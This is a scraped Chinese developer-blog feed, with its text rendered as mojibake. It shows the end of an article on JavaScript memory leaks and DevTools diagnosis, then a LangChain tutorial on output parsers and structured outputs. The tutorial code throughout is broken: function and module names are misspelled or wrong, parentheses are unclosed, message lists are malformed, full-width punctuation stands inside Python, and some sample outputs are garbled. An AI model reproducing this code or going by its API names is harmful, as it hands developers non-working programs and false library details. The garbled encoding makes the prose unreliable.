<p>ä¸Šé¢çš„ä»£ç æ˜¯æ˜ç›®å¼ èƒ†çš„æŠ¢åŠ«ï¼Œä½†åœ¨æˆ‘ä»¬çš„æ—¥å¸¸ä¸šåŠ¡ä»£ç ä¸­ï¼Œæ›´å¤šçš„æ˜¯ <strong>æ…¢æ€§å·çªƒ</strong>â€”â€”ä¹Ÿå°±æ˜¯<strong>å†…å­˜æ³„æ¼ (Memory Leak)</strong>ã€‚</p>
<p>è™½ç„¶ä½ ä¸ä¼šå†™å‡º <code>while(true)</code>ï¼Œä½†ä»¥ä¸‹è¿™å‡ ç§æ“ä½œï¼Œå’Œä¸Šé¢çš„æ€§è´¨æ˜¯ä¸€æ ·çš„ï¼š</p>
<h4 data-id="heading-5">å¿˜è®°æ¸…é™¤çš„å®šæ—¶å™¨ / ç›‘å¬å™¨</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// React ç»„ä»¶ useEffect</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Fetching data...'</span>);
    <span class="hljs-comment">// é—­åŒ…å¼•ç”¨äº†å¤§é‡æ•°æ®</span>
  }, <span class="hljs-number">1000</span>);

  <span class="hljs-comment">// è‡´å‘½é”™è¯¯ï¼šå¿˜è®°å†™ return () =&gt; clearInterval(timer);</span>
}, []);
</code></pre>
<p>å¦‚æœä½ åœ¨ SPAï¼ˆå•é¡µåº”ç”¨ï¼‰é‡Œé¢‘ç¹åˆ‡æ¢è·¯ç”±ï¼Œè¿™ä¸ªç»„ä»¶è™½ç„¶å¸è½½äº†ï¼Œä½† <code>timer</code> è¿˜åœ¨è·‘ï¼Œå¼•ç”¨çš„æ•°æ®è¿˜åœ¨å†…å­˜é‡Œã€‚åˆ‡å‡ åæ¬¡è·¯ç”±ï¼Œé¡µé¢å°±å¡æˆ PPT äº†ã€‚</p>
<h4 data-id="heading-6">æ¸¸ç¦»çš„ DOM èŠ‚ç‚¹</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">let</span> detachedNodes = [];
<span class="hljs-keyword">function</span> <span class="hljs-title function_">create</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> ul = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'ul'</span>);
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    ul.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'li'</span>));
  }
  <span class="hljs-comment">// è™½ç„¶è¿™ä¸ª ul æ²¡æœ‰æ’å…¥åˆ° document.body é‡Œ</span>
  <span class="hljs-comment">// ä½†å®ƒè¢«å…¨å±€å˜é‡ detachedNodes å¼•ç”¨ç€ï¼Œæ— æ³•å›æ”¶ï¼</span>
  detachedNodes.<span class="hljs-title function_">push</span>(ul); 
}
</code></pre>
<p>å¾ˆå¤šå›¾è¡¨åº“ï¼ˆECharts ç­‰ï¼‰å¦‚æœé”€æ¯æ—¶ä¸è°ƒç”¨ <code>dispose()</code>ï¼Œå°±ä¼šç•™ä¸‹è¿™ç§å†…å­˜å¹½çµã€‚</p>
<h4 data-id="heading-7">3. é—­åŒ…é™·é˜±</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> heavyData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1000000</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">'*'</span>); <span class="hljs-comment">// å¤§æ•°æ®</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'I am keeping heavyData alive!'</span>);
    <span class="hljs-comment">// è™½ç„¶ inner åªç”¨åˆ°äº† consoleï¼Œä½†å› ä¸ºå®ƒåœ¨ outer å†…éƒ¨</span>
    <span class="hljs-comment">// æœ‰äº›æ—§å¼•æ“å¯èƒ½ä¼šè¿å¸¦æŠŠ heavyData ä¸€èµ·ä¿ç•™åœ¨é—­åŒ…ä¸Šä¸‹æ–‡ä¸­</span>
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-8">å¦‚ä½•é˜²æ­¢å‘¢ï¼Ÿ</h3>
<p>å¦‚æœä¸å¹¸é‡åˆ°äº†é¡µé¢è¶Šç”¨è¶Šå¡ï¼Œæ€ä¹ˆæ’æŸ¥æ˜¯ä¸æ˜¯å†…å­˜æ³„éœ²ï¼Ÿ</p>
<p><strong>Chrome DevTools æ˜¯ä½ æœ€å¥½çš„æ’æŸ¥å·¥å…·ï¼š</strong></p>
<ol>
<li>
<p><strong>æ‰“å¼€ Performance Monitorï¼ˆæ€§èƒ½ç›‘è§†å™¨ï¼‰ï¼š</strong></p>
<ul>
<li><code>F12</code> -&gt; <code>Esc</code> -&gt; é€‰æ‹© <code>Performance monitor</code>ã€‚</li>
<li>ç›¯ç€ <strong>JS å †</strong> å’Œ <strong>DOM èŠ‚ç‚¹</strong>ã€‚</li>
<li>å¦‚æœä½ åšè¿‡ä¸€é GCï¼ˆç‚¹å‡» Memory é¢æ¿çš„å°åƒåœ¾æ¡¶ï¼‰ï¼Œè¿™ä¸¤ä¸ªæ•°å€¼<strong>åªå¢ä¸å‡</strong>ï¼Œæ­å–œä½ ï¼Œæ¼äº†ã€‚</li>
</ul>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/555e26dc29404827b8c2ca98775ad09c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=Vxjqi3t6VOuxanWMrbuCiG%2FsNCQ%3D" alt="screenshot-20260113-115223.png" loading="lazy"/></p>
<ol>
<li>
<p><strong>Memory é¢æ¿æŠ“å¿«ç…§ï¼š</strong></p>
<ul>
<li>å½•åˆ¶ <strong>Heap Snapshot</strong>ã€‚</li>
<li>æœç´¢ <code>Detached</code>ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰çº¢è‰²çš„æ¸¸ç¦» DOM èŠ‚ç‚¹ã€‚</li>
<li>æˆ–è€…å¯¹æ¯”ä¸¤æ¬¡å¿«ç…§ï¼ˆAllocation instrumentation on timelineï¼‰ï¼Œçœ‹çœ‹åˆ°åº•æ˜¯å“ªä¸ªå¯¹è±¡åœ¨ç–¯ç‹‚å¢é•¿ã€‚</li>
</ul>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ff277c7919f4e74871d6c58a3d3d1f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=6F7Mla2SkPash%2FjMYYEhwBR%2BX7g%3D" alt="screenshot-20260113-115755.png" loading="lazy"/></p>
<hr/>
<p>é‚£è¡Œè®©æµè§ˆå™¨å´©æºƒçš„ä»£ç ï¼Œå¤§å®¶ç©ç©å°±å¥½ï¼Œ<strong>åƒä¸‡åˆ«å†™åˆ°ç”Ÿäº§ç¯å¢ƒé‡Œ</strong>ï¼ˆé™¤éä½ æ¸´æœ›è¢«è¿ç»´æç€åˆ€è¿½æ€ğŸ¤£ï¼‰ã€‚</p>
<p>å‰ç«¯å·¥ç¨‹å¸ˆçš„ä»·å€¼ï¼Œä¸åªæ˜¯æŠŠé¡µé¢ç”»å‡ºæ¥ï¼Œæ›´æ˜¯è¦ä¿è¯é¡µé¢åœ¨<strong>é•¿æ—¶é—´è¿è¡Œ</strong>ä¸‹ä¾ç„¶ä¸æ»‘ã€‚</p>
<p>ä¸‹æ¬¡å†é‡åˆ°é¡µé¢å¡é¡¿ï¼Œåˆ«å…‰é¡¾ç€æ€ªç½‘ç»œæ…¢ï¼Œæ‰“å¼€æ§åˆ¶å°çœ‹çœ‹ï¼Œè¯´ä¸å®šæ˜¯ä½ å†™çš„æŸä¸ªå†…å­˜æ³„æ¼ä»£ç æ­£åœ¨æ‚„æ‚„åå™¬ç”¨æˆ·çš„å†…å­˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02c7df1509e947b1be0bbd9c68ff51dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=T61UzpSkI%2FhGjkbRYjfKzBDbbpA%3D" alt="è°¢è°¢å¤§å®¶.gif" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[langchainæ ¸å¿ƒç»„ä»¶ Model I/Oï¼ˆ3ï¼‰-OutputParser]]></title>    <link>https://juejin.cn/post/7594302398687199286</link>    <guid>https://juejin.cn/post/7594302398687199286</guid>    <pubDate>2026-01-13T02:34:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594302398687199286" data-draft-id="7594350054091522090" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="langchainæ ¸å¿ƒç»„ä»¶ Model I/Oï¼ˆ3ï¼‰-OutputParser"/> <meta itemprop="keywords" content="LangChain"/> <meta itemprop="datePublished" content="2026-01-13T02:34:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é€¸å‡¡"/> <meta itemprop="url" content="https://juejin.cn/user/2921852864575780"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            langchainæ ¸å¿ƒç»„ä»¶ Model I/Oï¼ˆ3ï¼‰-OutputParser
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2921852864575780/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é€¸å‡¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:34:39.000Z" title="Tue Jan 13 2026 02:34:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">2.5.1 è¾“å‡ºè§£æå™¨ä»‹ç»</h2>
<p>åœ¨åº”ç”¨å¼€å‘ä¸­ï¼Œå¤§æ¨¡å‹çš„è¾“å‡ºå¯èƒ½æ˜¯ä¸‹ä¸€æ­¥é€»è¾‘å¤„ç†çš„å…³é”®è¾“å…¥ã€‚å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè§„èŒƒåŒ–è¾“å‡ºæ˜¯å¿…é¡»è¦åšçš„ä»»åŠ¡ï¼Œä»¥ç¡®ä¿åº”ç”¨èƒ½å¤Ÿé¡ºåˆ©è¿›è¡Œåç»­çš„é€»è¾‘å¤„ç†ã€‚</p>
<p>è¯­è¨€æ¨¡å‹è¿”å›çš„å†…å®¹é€šå¸¸éƒ½æ˜¯æ–‡æœ¬å­—ç¬¦ä¸²ï¼Œè€Œå®é™…AIåº”ç”¨å¼€å‘è¿‡ç¨‹ä¸­æœ‰æ—¶å¸Œæœ›æ¨¡å‹å¯ä»¥è¿”å›æ›´ç›´è§‚ã€æ›´æ ¼å¼åŒ–çš„å†…å®¹ï¼ŒLangChainæä¾›äº†è¾“å‡ºè§£æå™¨ï¼ˆOutput Parserï¼‰å°†æ¨¡å‹è¾“å‡ºè§£æä¸ºç»“æ„åŒ–æ•°æ®ã€‚</p>
<p>æœ‰å¤šç§ç±»å‹çš„è¾“å‡ºè§£æå™¨ï¼Œå¸¸ç”¨çš„æœ‰ StrOutputParserï¼ˆå­—ç¬¦ä¸²è§£æå™¨ï¼‰ä¸ JsonOutputParserï¼ˆJSON è§£æå™¨ï¼‰ã€‚</p>
<h2 data-id="heading-1">2.5.2 StrOutputParser</h2>
<p>StrOutputParser æ˜¯ä¸€ä¸ªç®€å•çš„è§£æå™¨ï¼Œä»ç»“æœä¸­æå– content å­—æ®µã€‚</p>
<p>ä¸¾ä¾‹ï¼šå°†æ¨¡å‹è¾“å‡ºç»“æœè§£æä¸ºå­—ç¬¦ä¸²</p>
<pre><code class="hljs language-ini" lang="ini">import os Â  
from langchain.chat_models import init_Chat_model Â  
from langchain_core.output_parser import StrOutputParser Â  
<span class="hljs-attr">llm</span> = init_chatting_model( 
    <span class="hljs-attr">model</span>=<span class="hljs-string">"openai/gpt-oss-20b:free"</span>, 
    <span class="hljs-attr">modelprovider</span>=<span class="hljs-string">"openai"</span>,
    <span class="hljs-attr">base_url</span>=<span class="hljs-string">"https://openrouter.ai/api/v1"</span>ï¼Œ 
    <span class="hljs-attr">api_key</span> = os.getenv(<span class="hljs-string">"OPENROUTER_API_KEY"</span>)ï¼Œ Â  
)Â  
<span class="hljs-attr">messages</span>=[ {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªæœºå™¨äºº"</span>}ï¼Œ {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä½ å¥½"</span>}] Â  
<span class="hljs-attr">resp</span> = llm.invoke(messages)
print(respï¼‰<span class="hljs-comment"># content'ä½ å¥½ï¼æœ‰ä»€ä¹ˆæˆ‘å¯ä»¥å¸®å¿™çš„å—ï¼Ÿ'Â  </span>
<span class="hljs-attr">str_resp</span> = StrOutputParser().invoke(resp) Â  
print(str_respï¼‰<span class="hljs-comment"># ä½ å¥½ï¼æœ‰ä»€ä¹ˆæˆ‘å¯ä»¥å¸®å¿™çš„å—ï¼Ÿ</span>
</code></pre>
<h2 data-id="heading-2">2.5.3 JsonOutputParser</h2>
<p>JSONè§£æå™¨ç”¨äºå°†å¤§æ¨¡å‹çš„è‡ªç”±æ–‡æœ¬è¾“å‡ºè½¬æ¢ä¸ºç»“æ„åŒ–JSONæ•°æ®çš„å·¥å…·ã€‚ç‰¹åˆ«é€‚ç”¨äºéœ€è¦ä¸¥æ ¼ç»“æ„åŒ–è¾“å‡ºçš„åœºæ™¯ï¼Œæ¯”å¦‚APIè°ƒç”¨ã€æ•°æ®å­˜å‚¨æˆ–ä¸‹æ¸¸ä»»åŠ¡å¤„ç†ã€‚</p>
<p>JsonOutputParser èƒ½å¤Ÿç»“åˆ Pydantic æ¨¡å‹è¿›è¡Œæ•°æ®éªŒè¯ï¼Œè‡ªåŠ¨éªŒè¯å­—æ®µç±»å‹å’Œå†…å®¹ï¼ˆå¦‚å­—ç¬¦ä¸²ã€æ•°å­—ã€åµŒå¥—å¯¹è±¡ç­‰ï¼‰</p>
<p>ä½¿ç”¨get_formatInstructions()è·å–JSONè§£æçš„æ ¼å¼åŒ–æŒ‡ä»¤ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">from pydantic import BaseModel, Field Â  
from langchain_core.output_parser import JsonOutputParser Â  
class Prime(BaseModel): 
    prime: list<span class="hljs-section">[int]</span>=Field(<span class="hljs-attr">description</span>=<span class="hljs-string">"ç´ æ•°"</span>) 
    count: list<span class="hljs-section">[int]</span> = Field(<span class="hljs-attr">description</span> = <span class="hljs-string">"å°äºè¯¥ç´ æ•°çš„ç´ æ•°ä¸ªæ•°"</span>) Â  
<span class="hljs-attr">json_parser</span> = JsonOutputParser(pydantic_object=Prime) 
print (json_parser.get_format Instructions()) 
<span class="hljs-comment"># The output should be formatted as a JSON instance that conforms to the JSON schema below.</span>
</code></pre>
<p>ä¸¾ä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">import os Â 
from pydantic import BaseModel, Field Â 
from langchain.chat_models import init_chatting_model
from langchain_core.output_parser import JsonOutputParser Â  
<span class="hljs-attr">llm</span> = init_chatting_model(
    <span class="hljs-attr">model</span> = <span class="hljs-string">"openai/gpt-oss-20b:free"</span>,
    <span class="hljs-attr">modelprovider</span> = <span class="hljs-string">"openai"</span>, 
    <span class="hljs-attr">base_url</span> = <span class="hljs-string">"https://openrouter.ai/api/v1"</span>, 
    <span class="hljs-attr">api_key</span> =os.getenv(<span class="hljs-string">"OPENROUTER_API_KEY"</span>), Â  
class Prime(BaseModel): 
    prime: list<span class="hljs-section">[int]</span>=Field(<span class="hljs-attr">description</span>=<span class="hljs-string">"ç´ æ•°"</span>) 
    count: list<span class="hljs-section">[int]</span>=Field(<span class="hljs-attr">description</span>=<span class="hljs-string">"å°äºè¯¥ç´ æ•°çš„ç´ æ•°ä¸ªæ•°"</span>) Â  
<span class="hljs-attr">json_parser</span> = JsonOutputParser(pydantic_object=Prime) messages={<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: json_parser.get_formatInstructions}}, { <span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä»»æ„ç”Ÿæˆ5ä¸ª1000-100000ä¹‹é—´ç´ æ•°ï¼Œå¹¶æ ‡å‡ºå°äºè¯¥ç´ æ•°çš„ ç´ æ•°ä¸ªæ•°"</span>ï¼Œ }, Â  
] Â  
<span class="hljs-attr">resp</span> = llm.invoke(messages) 
<span class="hljs-attr">jsonResp</span>=json_parser.invoke (resp) 
print(jsonResp) 
<span class="hljs-comment">#{'prime':[1009,2003,3001,4001,5003], 'count':[168,303, 430,584,669]}</span>
</code></pre>
<h2 data-id="heading-3">2.6 Structured Outputs</h2>
<p>å¯ä»¥è¦æ±‚æ¨¡å‹æŒ‰ç…§ç»™å®šçš„æ¨¡å¼æ ¼å¼æä¾›å…¶å“åº”ï¼Œè¿™æœ‰åŠ©äºç¡®ä¿è¾“å‡ºå¯ä»¥è¢«è½»æ¾è§£æå¹¶åœ¨åç»­å¤„ç†ä¸­ä½¿ç”¨ã€‚LangChainæ”¯æŒå¤šç§æ¨¡å¼ç±»å‹å’Œå¼ºåˆ¶ç»“æ„åŒ–è¾“å‡ºçš„æ–¹æ³•ã€‚</p>
<h2 data-id="heading-4">2.6.1TypedDict</h2>
<p>TypedDict æä¾›äº†ä¸€ä¸ªä½¿ç”¨ Python å†…ç½®ç±»å‹çš„ç®€å•æ–¹æ¡ˆï¼Œä½†æ˜¯æ²¡æœ‰éªŒè¯åŠŸèƒ½ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> os Â 
from typing <span class="hljs-keyword">import</span> Dict, Annotated Â 
from langchain.chat_models <span class="hljs-keyword">import</span> <span class="hljs-keyword">init</span> chatting_model

llm = <span class="hljs-keyword">init</span> chatting_model(
 Â  Â model=<span class="hljs-string">"openai/gpt-oss-20b:free"</span>,
 Â  Â modelprovider=<span class="hljs-string">"openai"</span>,
 Â  Â base_url=<span class="hljs-string">"https://openrouter.ai/api/v1"</span>,
 Â  Â api_key=os.getenv(<span class="hljs-string">"OPENROUTER_API_KEY"</span>),
) 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>(TypedDict):
 Â  Â animal: Annotated[str, <span class="hljs-string">"åŠ¨ç‰©"</span>]
 Â  Â emoji: Annotated[str, <span class="hljs-string">"è¡¨æƒ…"</span>]
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AnimalList</span>(TypedDict):
 Â  Â animals: Annotated[list[Animal], <span class="hljs-string">"åŠ¨ç‰©ä¸è¡¨æƒ…åˆ—è¡¨"</span>]
messages = [<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä»»æ„ç”Ÿæˆä¸‰ç§åŠ¨ç‰©ï¼Œä»¥åŠä»–ä»¬çš„emojiè¡¨æƒ…"</span>]
llm_with_structured_output = llm.with_structured_output(AnimalList)
resp = llm_with_structured_output.invoke(messages)
print(resp)
#{<span class="hljs-string">'animals'</span>: [<span class="hljs-string">'animal'</span>: <span class="hljs-string">'çŒ«'</span>, <span class="hljs-string">'emoji'</span>: <span class="hljs-string">'é¸Ÿ'</span>}, {<span class="hljs-string">'animal'</span>: <span class="hljs-string">'è€è™'</span>, <span class="hljs-string">'emoji'</span>: <span class="hljs-string">'â–¡'</span>}, {<span class="hljs-string">'animal'</span>: <span class="hljs-string">'ä¼é¹…'</span>, <span class="hljs-string">'emoji'</span>: <span class="hljs-string">'â–¡'</span>}]}
</code></pre>
<h2 data-id="heading-5">2.6.2 Pydantic</h2>
<p>Pydantic æ¨¡å‹æä¾›äº†ä¸°å¯Œçš„åŠŸèƒ½é›†ï¼ŒåŒ…æ‹¬å­—æ®µéªŒè¯ã€æè¿°å’ŒåµŒå¥—ç»“æ„ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">import os Â  
from pydantic import BaseModel,Field Â  
from langchain.chat_models import init_chat_model Â  
<span class="hljs-attr">llm</span> = init_chatting_model( 
    <span class="hljs-attr">model</span> = <span class="hljs-string">"openai/gpt-oss-20b:free"</span>, 
    <span class="hljs-attr">modelprovider</span> = <span class="hljs-string">"openai"</span>, 
    <span class="hljs-attr">base_url</span> = <span class="hljs-string">"https://openrouter.ai/api/v1"</span>, 
    <span class="hljs-attr">api_key</span> = os.getenv(<span class="hljs-string">"OPENROUTER_API_KEY"</span>), Â  
class Animal(BaseModel):
    animal: <span class="hljs-attr">str</span>=Field(description=<span class="hljs-string">"åŠ¨ç‰©"</span>) Â 
    emoji: <span class="hljs-attr">str</span>=Field(description=<span class="hljs-string">"è¡¨æƒ…"</span>) Â 
class AnimalList(BaseModel): Â 
    animals: list<span class="hljs-section">[Animal]</span> = Field(<span class="hljs-attr">description</span>=<span class="hljs-string">"åŠ¨ç‰©ä¸è¡¨æƒ…åˆ—è¡¨"</span>) Â 
    <span class="hljs-attr">messages</span> = [<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"ä»»æ„ç”Ÿæˆä¸‰ç§åŠ¨ç‰©ï¼Œä»¥åŠä»–ä»¬çš„emojiè¡¨æƒ…"</span>] Â 
<span class="hljs-attr">llm_with_structured_output</span> = llm.with_structured_output(AnimalList) Â 
<span class="hljs-attr">resp</span> = llm_with_structured_output.invoke(messages) Â 
print(resp) Â 
</code></pre>
<h2 data-id="heading-6">2.6.3 JSON Schema</h2>
<p>è‹¥éœ€æœ€å¤§ç¨‹åº¦çš„æ§åˆ¶æˆ–äº’æ“ä½œæ€§ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸå§‹çš„JSON Schemaã€‚è¯¦æƒ…å¯å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.openai.com%2Fdocs%2Fguides%2Fstructured-outputs%2Fjson-schema%23supported-schemas" target="_blank" title="https://platform.openai.com/docs/guides/structured-outputs/json-schema#supported-schemas" ref="nofollow noopener noreferrer">platform.openai.com/docs/guidesâ€¦</a>ã€‚</p>
